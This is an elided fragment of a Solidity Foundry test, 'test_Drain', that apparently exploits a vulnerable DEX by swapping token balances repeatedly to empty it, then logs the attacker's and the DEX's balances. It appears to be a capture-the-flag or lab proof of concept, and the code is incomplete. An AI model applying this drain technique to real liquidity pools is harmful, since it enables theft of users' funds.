...
contract DexTest is Test {
    ...
    function test_Drain() public {
        ...
        for(uint256 i; i<2; i++){
            ...
            dex.swap(address(swappabletoken2), address(swappabletoken1), swappabletoken2.balanceOf(address(dex)));
        
        console.log("Attacker Balance Token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker Balance Token2:", swappabletoken2.balanceOf(attacker));
        console.log("Dex Balance Token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("Dex Balance Token2:", swappabletoken2.balanceOf(address(dex)));
